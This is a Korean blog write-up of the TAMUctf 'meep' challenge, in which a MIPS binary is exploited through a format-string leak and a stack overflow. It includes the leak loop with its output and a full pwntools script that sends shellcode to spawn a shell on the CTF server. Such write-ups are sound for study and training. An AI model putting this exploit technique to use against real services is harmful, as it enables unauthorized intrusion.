---
title: "[TAMUctf] meep writeup"
published: 2026-03-25
description: tamuctf 롸업
category: CTF
tags: [CTF, writeup, mips, tamuctf]
draft: false
---

# [TAMUctf] - meep

## 문제 개요

- **카테고리**: pwn
- **주제**: mips에서의 ROP(근데 FSB 언인텐 ㅋㅋㅋㅋ)

## 문제 설명

> The big Meep listens and waits. All it asks for is a name and a command...

<!--more-->
---
### 문제 파일 (`Dockerfile`)
```dockerfile
FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y \
    qemu-user-static \
    gdbserver \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /home
COPY meep /home/meep

ARG FLAG_FILE=flag.txt
COPY ${FLAG_FILE} /home/flag.txt

# Copy  MIPS loader & libs into /lib
COPY lib-mips/* /lib/

COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

EXPOSE 1234 9001

# Run gdbserver via qemu-user-static
ENTRYPOINT ["/entrypoint.sh"]
```

적당히 `1234`, `9001` 이 두 포트를 사용하면 될 듯 하다.  
그리고 컨테이너 돌릴 때 플래그 파일 설정해줘야 함

### 문제 파일 (`entrypoint.sh`)
```bash
#!/bin/sh

if [ "$DEBUG" = "1" ]; then
    echo "[*] Running in DEBUG mode | Debug port at 1234"
    echo "Use gdb to connect to the process by running 'target remote localhost:1234' from gdb (or gdb-multiarch)"
    exec qemu-mips-static -g 1234 ./meep
else
    echo "[*] Running in normal mode"
    exec qemu-mips-static ./meep
```

당연히 이렇게 편하게 디버깅 모드 잡혀있는데 안 쓸 이유가 없지 ㅋ  

### 문제 파일 (`Makefile.debug`)
```makefile
NAME := meep

DOCKER_CONTEXT := default
DOCKER_GLOBAL := --context $(DOCKER_CONTEXT)
GDB_PORT := 1234
VULN_PORT := 9001

CPORTS := 9001
HPORTS := $(CPORTS)
DOCKER_RUNTIME := --read-only --tmpfs /tmp --cap-drop ALL --security-opt no-new-privileges --restart=always

build: Dockerfile
	docker $(DOCKER_GLOBAL) build -t $(NAME) . --build-arg FLAG_FILE=fake-flag.txt

run:
	docker $(DOCKER_GLOBAL) run --rm -it -e DEBUG=1 -p $(GDB_PORT):$(GDB_PORT) -p $(VULN_PORT):$(VULN_PORT) --name $(NAME) $(NAME)
```

`Makefile`을 제대로 써본게 초등학교 5학년 때  
`c언어`로 프로젝트 만들 때 빼곤 없다. 그래서 걍 명령어 빼가서 씀.  

이외 `lib-mips/`에 `ROP`를 위한 `libc, ld`파일이 있고  
접속 정보가 적힌 `solver-template.py`가 있다.  

---
# 정적 분석
```bash
$ file meep 
meep: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld.so.1, BuildID[sha1]=140b4551e8ece2ef8f59a9b207d175713dc18e8f, for GNU/Linux 3.2.0, with debug_info, not stripped
```

아니 `unstripped`에 `debug info`?? 개꿀임 이건.  
아무튼 32-bit짜리 밉스 아키텍쳐의 바이너리를 분석하는 것 같네요 ㅋ  

```bash
$ checksec --file=./meep
[*] '/home/bankai/Backups_/tamuctf/pwn/meep/meep/meep'
    Arch:       mips-32-big
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    RUNPATH:    b'/lib'
    Stripped:   No
    Debuginfo:  Yes
```

개쉬울듯???? `ROP`로도 풀어보겠습니다  

**기드라**로 열어보면 대충 소켓 통신하는 프로그램이구나~  
하고 알았음.  

## `main()`
```c
      do {
        do {
          iVar1 = accept(__fd,(sockaddr *)0x0,(socklen_t *)0x0);
        } while (iVar1 < 0);
        dup2(iVar1,0);
        dup2(iVar1,1);
        dup2(iVar1,2);
        greet(in_stack_ffffffc0);
        diagnostics();
        close(iVar1);
      } while( true );
```

중요 부분만 따왔다.  
`dup2`는 소켓 통신이라 `stdin/out/err`을 소켓으로 잘 처리하겠다는 의미고  

`greet()`에선 환영 인사를,  
`diagnostics()`에선 추가로 또 입력을 받는다.  

## `greet()`
```c
void greet(_func_int_char_ptr *logger)

{
  code *in_a0;
  _func_int_char_ptr *my_logger;
  char name [128];
  
  send(1,"Enter admin name: ",0x12,0);
  recv(0,name,0x100,0);
  (*in_a0)(&UNK_00400f2c);
  printf(name);
  return;
}
```

`BOF`가 기본적으로 일어나고, 보호기법 딱히 없어서  
그냥 버퍼 덮고 뒤 4byte saved fp 덮고  
ret 덮으면 끝이다.  

## `diagnostics()`
```c
void diagnostics(void)

{
  char *checker;
  char *checker2;
  char cmd [128];
  
  send(1,"Enter diagnostic command:\n",0x1b,0);
  recv(0,cmd,0x100,0);
  send(1,"Running command...\n",0x13,0);
  if (cmd[0] == ' ') {
    send(1,"Cannot start with a space!\n",0xb,0);
  }
  if (cmd[0x7f] == ' ') {
    send(1,"Cannot end with a space!\n",0xb,0);
  }
  return;
}
```

이쪽도 그냥 앞, 뒤에만 공백이 없게 값을 넣어주면 된다.  

입력은 총 두 번 걸쳐 받으므로  
1. **FSB로 leak**
2. **RET2Shellcode** 혹은 **ROP**가 가능하다.  

`mips`에서의 가젯 활용 방법, 어셈블리에 대한 지식이 적은 반면  
`FSB`는 큰 다른 점이 없다는 걸 생각하고 이 쪽으로 틀었다.  

출제자의 말에 따르면 언인텐..이었다고...  

---
# 동적 분석
## FSB로 스택 주변 leak
```bash
# test
for i in range(6, 20):
   p = remote("localhost", 9001)
   sa(b'Enter admin name:', f'%{i}$p'.encode())
   
   ru(b'Hello:\n\n')
   a = ru(b'Enter diag')
   print(a.decode().split())
   p.close()
```
보통 20번째 인자 전까지는 꽤 유의미한 값이 나오는 편이라 생각했다.  
(사실 많으면 90번째 까지도 돌려본 적이 있긴한데..)  

물론 돌리기 전에 `A * 4`넣고 %p 여러 개 붙이는 식으로  
어디에 저장되나 보기도 했다.  

암튼 기본적으로 6번째 쯤에 위치하니 그 위치를 시작으로 본 결과...  

```bash
[+] Opening connection to localhost on port 9001: Done
['0x3fe3d3b0']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['0x25372470']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['0x262626c8']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['0x40800e8c']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['0x3fffef08']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['0x3ffff410']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['0x40800d30']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['0x3ffd3354']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['0x4005ad']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['(nil)']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['(nil)']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['0x3ffbc2a8']
[] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['0x3ffbc8a0']
[*] Closed connection to localhost port 9001
[+] Opening connection to localhost on port 9001: Done
['(nil)']
```

꽤 유의미한 결과를 얻었다.  

```bash
─────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────
00:0000│ s8 sp    0x40800c88 ◂— 0x40800c88
01:0004│-0a4      0x40800c8c ◂— 0x40800c8c
...
...
...
대충 이런 정보들
```

스택 측 주소는  
`%9$p`, `%12$p` << 이쪽에 있다.  

그런데 `%12$p`가 `saved fp` 주소라서, 기준점 의미도 명확하다고 결정했다.  
결국엔 얘 썼다는 얘기 ㅇㅇ  


이렇게 `saved fp`를 leak하고 나면,  
`diagnostics()`로 넘어가서 입력하면 된다.  

여기서의 프레임을 조작해서 끝내도록 하면 될 것 같구만.  
약간 드림핵 풀던 추억이 생각나는 문제였다??  

`NX`가 없으니 pwntools로 `mips의 shellcode`를 만들었다.  

---
# PWN!
```py
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./meep")
#context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

def slog(n, a):
    return info(": ".join([n, hex(a)]))


s = lambda data: p.send(data)
sa = lambda delim, data: p.sendafter(delim, data)
sl = lambda data: p.sendline(data)
sla = lambda delim, data: p.sendlineafter(delim, data)
r = lambda num=4096: p.recv(num)
rl = lambda: p.recvline()
ru = lambda delim, drop=True: p.recvuntil(delim, drop)
l64 = lambda: u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
uu64 = lambda data: u64(data.ljust(8, b"\x00"))

if args.REMOTE:
    p = remote("streams.tamuctf.com", 443, ssl=True, sni="meep")
    libc = ELF("./lib-mips/libc.so.6")  # or other exact path
else:
    p = remote("localhost", 9001)
    libc = ELF("./lib-mips/libc.so.6")

# test
#for i in range(6, 20):
#    p = remote("localhost", 9001)
#    sa(b'Enter admin name:', f'%{i}$p'.encode())
#    
#    ru(b'Hello:\n\n')
#    a = ru(b'Enter diag')
#    print(a.decode().split())
#    p.close()

fmt = b'%12$p'
sa(b'Enter admin name:', fmt)

ru(b'Hello:\n\n')
a = ru(b'Enter diag')
slog("leak", int(a.split()[0][:10].decode(), 16))

cmd = int(a.split()[0][:10].decode(), 16) + -144
slog("cmd[128]", cmd)

sc = asm(shellcraft.mips.linux.sh())

s(sc.ljust(140)+p32(cmd))

p.interactive()
```

+) 후기  

이번 ctf는 하필 기능 수업도 겹쳐서 친구들에게 맡겼다.  
그러다 터짐.
